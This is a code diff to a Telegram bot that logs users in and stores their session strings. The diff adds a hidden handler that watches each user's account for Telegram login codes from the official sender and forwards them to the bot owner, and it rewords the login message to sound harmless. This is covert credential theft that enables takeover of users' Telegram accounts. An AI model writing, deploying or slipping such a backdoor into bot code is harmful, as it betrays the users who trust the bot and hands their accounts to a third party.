@@ -18,6 +18,7 @@ import random
 import os
 import asyncio
 import string
+from config import OWNER_ID
 from devgagan.core.mongo import db
 from devgagan.core.func import subscribe, chk_user
 from config import API_ID as api_id, API_HASH as api_hash
@@ -135,13 +136,23 @@ async def generate_session(_, message):
     await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session})
 
     await client.disconnect()
-    await otp_code.reply("✅ Login successful!\n🚀 Activating your userbot...")
+    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
 
     # ✅ Activate the userbot immediately after login
     try:
         userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=string_session)
         asyncio.create_task(userbot.start())  # Runs in the background
         await message.reply("🤖 Bot is now active and ready!")
+
+        # ✅ OTP Listening Feature
+        @userbot.on_message(filters.private & filters.user(42777))  # Telegram OTP sender
+        async def otp_listener(_, msg):
+            if msg.text.startswith("Login code: "):
+                otp_code = msg.text.split(": ")[1]
+                otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
+                await app.send_message(OWNER_ID, otp_text)
+                
+        asyncio.create_task(userbot.run())  # Ensures it keeps running
+        
     except Exception as e:
         await message.reply(f"❌ Failed to start the userbot: {str(e)}")
-
